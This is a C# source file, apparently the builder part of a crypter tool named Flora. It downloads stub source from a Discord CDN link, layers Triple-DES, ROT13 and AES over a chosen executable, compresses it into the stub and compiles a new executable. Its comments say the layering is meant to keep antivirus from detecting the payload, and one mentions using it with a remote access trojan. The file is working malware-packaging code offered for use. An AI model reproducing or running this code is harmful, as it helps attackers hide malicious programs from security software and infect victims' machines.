using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO.Compression;
using System.CodeDom;
using System.Reflection;


namespace Flora
{
    internal class Builder
    {
        public static void BUILDER()
        {
            //Get stub sourcecode.
            WebClient downbin = new WebClient();
            var og = downbin.DownloadData("https://cdn.discordapp.com/attachments/996171502070272102/1034281848228024353/scr.txt");
            var pure = Encoding.UTF8.GetString(og);
            var dec = Convert.FromBase64String(pure);
            var zop = Encoding.UTF8.GetString(dec);
            //Write Sourcecode In file
            File.WriteAllText("src.txt", zop);
            

            Write();

            

        }

        // Replaces Key strings in source like ***Bin or ***IN (Delay) I just made a function that I can call on to automaticly replace depending on the args data.
        public static void RA(string data, string ext)
        {
            var dat = data;
            
            string bind = dat;
            string text = File.ReadAllText("CON.cs");
            text = text.Replace(ext, bind);
            File.WriteAllText("CON.cs", text);
            

            
        }

        //String Bin Compresser Will reduce the size by packing the string.
        public static string CompressString(string text)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(text);
            var memoryStream = new MemoryStream();
            using (var gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
            {
                gZipStream.Write(buffer, 0, buffer.Length);
            }

            memoryStream.Position = 0;

            var compressedData = new byte[memoryStream.Length];
            memoryStream.Read(compressedData, 0, compressedData.Length);

            var gZipBuffer = new byte[compressedData.Length + 4];
            Buffer.BlockCopy(compressedData, 0, gZipBuffer, 4, compressedData.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(buffer.Length), 0, gZipBuffer, 0, 4);
            return Convert.ToBase64String(gZipBuffer);
        }

        //Reads the Stub sourcecode and Replaces it with the data from the options tab in the GUI
        public static void Write()
        {
            var dat = File.ReadAllBytes(Settings1.Default.EXEdata);
            var soul = Convert.ToBase64String(dat);
            var mega = Auto(soul);
            var meep = CompressString(mega);
            string bind = meep;
            string text = File.ReadAllText("src.txt");
            text = text.Replace("***Bin", bind);
            File.WriteAllText("CON.cs", text);
            RA(Settings1.Default.Timbox, "***IN");
            
            
            File.Delete("src.txt");
            
            Compile();
           
        }

        //Codedom compiler Will take the sourcecode and merge the dll assemblies and Dependencies.
        public static void Compile()
        {
            
            //Read and merge
            
            string source1 = File.ReadAllText(@"CON.cs");
            var references = new[] { "System.dll", "System.Core.Dll" };

            //In GUI determines the options of the use of Icon or no Icon. (work in Progress)

            if (Settings1.Default.USEICO == true)
            {
                CompilerResults results = CompileCsharpSource(new[] { source1 }, "FlowerBin.exe", references);
            } 
            else if (Settings1.Default.USEICO == false)
            {
                var results = moobi(new[] { source1 }, "FlowerBin.exe", references);
            }
            

            
            //File.Delete("CON.cs");
        }

        //Exe Options and setting loader
        private static CompilerResults CompileCsharpSource(string[] sources, string output, params string[] references)
        {

            
                var parameters = new CompilerParameters(references, output);
            //Exe options like load Icon and loads the Icon from the settings tab or the options tab in GUI
                parameters.GenerateExecutable = true;
                parameters.CompilerOptions = $@"/win32icon:{Settings1.Default.ico}";
            parameters.OutputAssembly = "Ambrosial.exe";

            using (var provider = new CSharpCodeProvider())
                    return provider.CompileAssemblyFromSource(parameters, sources);
            
            
            
        }

        private static CompilerResults moobi(string[] sources, string output, params string[] references)
        {
            //second option if icon is not checked (will compile without ICO)

            var parameters = new CompilerParameters(references, output);

            parameters.GenerateExecutable = true;
            

            using (var provider = new CSharpCodeProvider())
                return provider.CompileAssemblyFromSource(parameters, sources);



        }
        //String or Bin encrypter all the functions below this are used to ecrypt or to obfuscate the bin data Prevents the Av from detecting the Bin ecryption algorithm
        public static string Auto(string nope)
        {
            var mork = GetEncryptionKey("x/A?D(G+KbPdSgVkYp3s6v9y$B&E)H@M");
            
            var noai = EncryptData(mork, nope);
            var yai = Rot13.Transform(noai);


            var vao = Encrypt(yai, "x/A?D(G+KbPdSgVkYp3s6v9y$B&E)H@M");
           
            var nia = Rot13.Transform(vao);
            

            return nia;



        }

        

        // Use any sort of encoding you like. 

        public static byte[] bincon(String binary)
        {
            var list = new List<Byte>();

            for (int i = 0; i < binary.Length; i += 8)
            {
                String t = binary.Substring(i, 8);

                list.Add(Convert.ToByte(t, 2));
            }

            return list.ToArray();
        }

        //also used my remcos for obfuscation.
        public static class Rot13
        {

            public static string Transform(string value)
            {
                char[] array = value.ToCharArray();
                for (int i = 0; i < array.Length; i++)
                {
                    int number = (int)array[i];

                    if (number >= 'a' && number <= 'z')
                    {
                        if (number > 'm')
                        {
                            number -= 13;
                        }
                        else
                        {
                            number += 13;
                        }
                    }
                    else if (number >= 'A' && number <= 'Z')
                    {
                        if (number > 'M')
                        {
                            number -= 13;
                        }
                        else
                        {
                            number += 13;
                        }
                    }
                    array[i] = (char)number;
                }
                return new string(array);
            }
        }

        //AES-256 Ecryption
        public static string Encrypt(string plainText, string keyString)
        {
            byte[] cipherData;
            Aes aes = Aes.Create();
            aes.Key = Encoding.UTF8.GetBytes(keyString);
            aes.GenerateIV();
            aes.Mode = CipherMode.CBC;
            ICryptoTransform cipher = aes.CreateEncryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, cipher, CryptoStreamMode.Write))
                {
                    using (StreamWriter sw = new StreamWriter(cs))
                    {
                        sw.Write(plainText);
                    }
                }

                cipherData = ms.ToArray();
            }

            byte[] combinedData = new byte[aes.IV.Length + cipherData.Length];
            Array.Copy(aes.IV, 0, combinedData, 0, aes.IV.Length);
            Array.Copy(cipherData, 0, combinedData, aes.IV.Length, cipherData.Length);
            return Convert.ToBase64String(combinedData);
        }

        //AES-256 Decryption added to stub
        public static string Decrypt(string combinedString, string keyString)
        {
            string plainText;
            byte[] combinedData = Convert.FromBase64String(combinedString);
            Aes aes = Aes.Create();
            aes.Key = Encoding.UTF8.GetBytes(keyString);
            byte[] iv = new byte[aes.BlockSize / 8];
            byte[] cipherText = new byte[combinedData.Length - iv.Length];
            Array.Copy(combinedData, iv, iv.Length);
            Array.Copy(combinedData, iv.Length, cipherText, 0, cipherText.Length);
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            ICryptoTransform decipher = aes.CreateDecryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream(cipherText))
            {
                using (CryptoStream cs = new CryptoStream(ms, decipher, CryptoStreamMode.Read))
                {
                    using (StreamReader sr = new StreamReader(cs))
                    {
                        plainText = sr.ReadToEnd();
                    }
                }

                return plainText;
            }
        }
        //THIS IS ONLY FOR TRIPLE-DES KEY
        //Takes the enc key of the aes and cuts it down into the des key size. (More convienent)
        public static string GetEncryptionKey(string secretKey)
        {
            // MD5 is the hash algorithm expected by rave to generate encryption key
            var md5 = MD5.Create();

            // MD5 works with bytes so a conversion of plain secretKey to it bytes equivalent is required.
            byte[] secretKeyBytes = Encoding.UTF8.GetBytes(secretKey);

            byte[] hashedSecret = md5.ComputeHash(secretKeyBytes, 0, secretKeyBytes.Length);
            byte[] hashedSecretLast12Bytes = new byte[12];

            Array.Copy(hashedSecret, hashedSecret.Length - 12, hashedSecretLast12Bytes, 0, 12);
            String hashedSecretLast12HexString = BitConverter.ToString(hashedSecretLast12Bytes);

            hashedSecretLast12HexString = hashedSecretLast12HexString.ToLower().Replace("-", "");

            String secretKeyFirst12 = secretKey.Replace("FLWSECK-", "").Substring(0, 12);

            byte[] hashedSecretLast12HexBytes = Encoding.UTF8.GetBytes(hashedSecretLast12HexString);
            byte[] secretFirst12Bytes = Encoding.UTF8.GetBytes(secretKeyFirst12);
            byte[] combineKey = new byte[24];

            Array.Copy(secretFirst12Bytes, 0, combineKey, 0, secretFirst12Bytes.Length);
            Array.Copy(hashedSecretLast12HexBytes, hashedSecretLast12HexBytes.Length - 12, combineKey, 12, 12);

            var ha = Encoding.UTF8.GetString(combineKey);

            return ha;
        }

        //TRIPLE-DES ecryption algoritm calls the getenckey
        public static string EncryptData(string encryptionKey, string data)
        {
            TripleDES des = TripleDES.Create();
            des.Mode = CipherMode.ECB;
            des.Padding = PaddingMode.PKCS7;
            des.Key = Encoding.UTF8.GetBytes(encryptionKey);

            ICryptoTransform cryptoTransform = des.CreateEncryptor();
            byte[] dataBytes = Encoding.UTF8.GetBytes(data);
            byte[] encryptedDataBytes = cryptoTransform.TransformFinalBlock(dataBytes, 0, dataBytes.Length);

            des.Dispose();

            return Convert.ToBase64String(encryptedDataBytes);
        }
        //TRIPLE-DES Decryption algoritm
        public static string DecryptData(string encryptedData, string encryptionKey)
        {
            TripleDES des = TripleDES.Create();
            des.Key = Encoding.UTF8.GetBytes(encryptionKey);
            des.Mode = CipherMode.ECB;
            des.Padding = PaddingMode.PKCS7;

            ICryptoTransform cryptoTransform = des.CreateDecryptor();
            byte[] EncryptDataBytes = Convert.FromBase64String(encryptedData);
            byte[] plainDataBytes = cryptoTransform.TransformFinalBlock(EncryptDataBytes, 0, EncryptDataBytes.Length);

            des.Dispose();

            return Encoding.UTF8.GetString(plainDataBytes);
        }
    }
}
